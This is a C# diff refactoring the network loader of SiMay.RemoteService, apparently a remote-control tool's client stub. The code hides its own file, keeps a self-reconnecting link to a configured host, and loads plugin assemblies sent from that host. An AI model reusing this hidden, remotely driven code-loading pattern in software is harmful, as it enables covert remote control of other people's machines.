@@ -33,6 +33,11 @@ namespace SiMay.RemoteService.Loader
         private const string SERVICE_USER_START = "-user";
 
         /// <summary>
+        /// 表示ACK命令
+        /// </summary>
+        private const short C_GLOBAL_CONNECT = 1000;
+
+        /// <summary>
         /// 插件数据
         /// </summary>
         private const short S_GLOBAL_PLUGIN = 2;
@@ -50,12 +55,13 @@ namespace SiMay.RemoteService.Loader
         /// <summary>
         /// 主核心库文件名
         /// </summary>
-        private const string MAIN_PLUGIN_COMNAME = "SiMayServiceCore.dll";
+        private const string MAIN_PLUGIN_COMNAME = "SiMayService.Core.dll";
 
-        private static IAppMainService _appMainService;
 
+        private static bool _systemPermission;
         private static IPEndPoint _ipendPoint;
         private static StartParameter _startParameter;
+        private static IAppMainService _appMainService;
         private static TcpSocketSaeaClientAgent _clientAgent;
         private static Dictionary<string, byte[]> _pluginCOMs = new Dictionary<string, byte[]>();
         static void Main(string[] args)
@@ -116,6 +122,9 @@ namespace SiMay.RemoteService.Loader
                         Environment.Exit(0);
                 }
 
+                //是否服务安装
+                _systemPermission = args.Any(c => c.Equals(SERVICE_USER_START, StringComparison.OrdinalIgnoreCase));
+
                 if (_startParameter.IsHide)
                     SystemSessionHelper.FileHide(true);
 
@@ -154,9 +163,62 @@ namespace SiMay.RemoteService.Loader
                     clientConfig.AppKeepAlive = false;
                     clientConfig.KeepAlive = true;
                 }
+                clientConfig.CompressTransferFromPacket = false;
                 clientConfig.KeepAliveInterval = 5000;
                 clientConfig.KeepAliveSpanTime = 1000;
-                _clientAgent = TcpSocketsFactory.CreateClientAgent(TcpSocketSaeaSessionType.Packet, clientConfig, Notify);
+
+                _clientAgent = TcpSocketsFactory.CreateClientAgent(TcpSocketSaeaSessionType.Packet, clientConfig, (notify, session) =>
+                {
+                    //如果服务已加载，转交消息核心程序
+                    if (!_appMainService.IsNull())
+                    {
+                        _appMainService.Notify(notify, session);
+                        return;
+                    }
+
+                    switch (notify)
+                    {
+                        case TcpSessionNotify.OnConnected:
+
+                            var ackData = BuilderAckPacket(_startParameter.AccessKey, MAIN_CONNECT);//构造ACK数据包
+                            var carryAccessIdData = WrapAccessId(ackData, 0);//构造带AccessId信息的数据包
+                            session.SendAsync(carryAccessIdData);
+                            break;
+                        case TcpSessionNotify.OnSend:
+                            break;
+                        case TcpSessionNotify.OnDataReceiveing:
+                            break;
+                        case TcpSessionNotify.OnDataReceived:
+
+                            var packBody = TakeHeadAndMessage(session);
+                            var headInt = BitConverter.ToInt16(packBody, 0);
+                            switch (headInt)
+                            {
+                                case S_GLOBAL_PLUGIN:
+                                    AnalysisLoadAssemblyCOM(session, GetMessagePayload(packBody));
+                                    break;
+                                default:
+                                    break;
+                            }
+                            break;
+                        case TcpSessionNotify.OnClosed:
+
+                            System.Timers.Timer resetTimer = new System.Timers.Timer();
+                            resetTimer.Interval = 5000;
+                            resetTimer.Elapsed += (s, e) =>
+                            {
+                                //主连接重连
+                                ConnectToServer();
+
+                                resetTimer.Stop();
+                                resetTimer.Dispose();
+                            };
+                            resetTimer.Start();
+                            break;
+                        default:
+                            break;
+                    }
+                });
                 while (true) //第一次解析域名,直至解析成功
                 {
                     var ip = GetHostByName(_startParameter.Host);
@@ -189,60 +251,13 @@ namespace SiMay.RemoteService.Loader
             _clientAgent.ConnectToServer(_ipendPoint);
         }
 
-        private static void Notify(TcpSessionNotify notify, TcpSocketSaeaSession session)
+        private static byte[] GetMessagePayload(byte[] data)
         {
-            //如果服务已加载，转交消息核心程序
-            if (!_appMainService.IsNull())
-            {
-                _appMainService.Notify(notify, session);
-                return;
-            }
+            byte[] payload = new byte[data.Length - sizeof(short)];
+            Array.Copy(data, sizeof(short), payload, 0, payload.Length);
+            return payload;
 
-            switch (notify)
-            {
-                case TcpSessionNotify.OnConnected:
-
-                    var ackData = BuilderAckPacket(_startParameter.AccessKey, MAIN_CONNECT);//构造ACK数据包
-                    var carryAccessIdData = WrapAccessId(ackData, 0);//构造带AccessId信息的数据包
-                    session.SendAsync(carryAccessIdData);
-                    break;
-                case TcpSessionNotify.OnSend:
-                    break;
-                case TcpSessionNotify.OnDataReceiveing:
-                    break;
-                case TcpSessionNotify.OnDataReceived:
-
-                    var packBody = TakeHeadAndMessage(session);
-                    var headInt = BitConverter.ToInt16(packBody, 0);
-                    switch (headInt)
-                    {
-                        case S_GLOBAL_PLUGIN:
-                            AnalysisLoadAssemblyCOM(session, packBody);
-                            break;
-                        default:
-                            break;
-                    }
-                    break;
-                case TcpSessionNotify.OnClosed:
-
-                    System.Timers.Timer resetTimer = new System.Timers.Timer();
-                    resetTimer.Interval = 5000;
-                    resetTimer.Elapsed += (s, e) =>
-                    {
-                        //主连接重连
-                        ConnectToServer();
-
-                        resetTimer.Stop();
-                        resetTimer.Dispose();
-                    };
-                    resetTimer.Start();
-                    break;
-                default:
-                    break;
-            }
         }
-
-
         private static byte[] TakeHeadAndMessage(TcpSocketSaeaSession session)
         {
             var bytes = session.CompletedBuffer.Copy(sizeof(long), session.CompletedBuffer.Length - sizeof(long));
@@ -266,8 +281,10 @@ namespace SiMay.RemoteService.Loader
         /// <returns></returns>
         private static byte[] BuilderAckPacket(long accessKey, byte type)
         {
+            var headCommand = BitConverter.GetBytes(C_GLOBAL_CONNECT);
             var emptyLong = new byte[8];
             var byteBuilder = new List<byte>();
+            byteBuilder.AddRange(headCommand);
             byteBuilder.Add(type);
             byteBuilder.AddRange(emptyLong);
             byteBuilder.AddRange(BitConverter.GetBytes(accessKey));
@@ -304,7 +321,7 @@ namespace SiMay.RemoteService.Loader
                 if (mainType == null)
                     return;
 
-                _appMainService = Activator.CreateInstance(mainType, _startParameter, _clientAgent, session, _ipendPoint) as IAppMainService;
+                _appMainService = Activator.CreateInstance(mainType, _startParameter, _clientAgent, session, _ipendPoint, _systemPermission) as IAppMainService;
             }
         }
         public static string GetHostByName(string host)
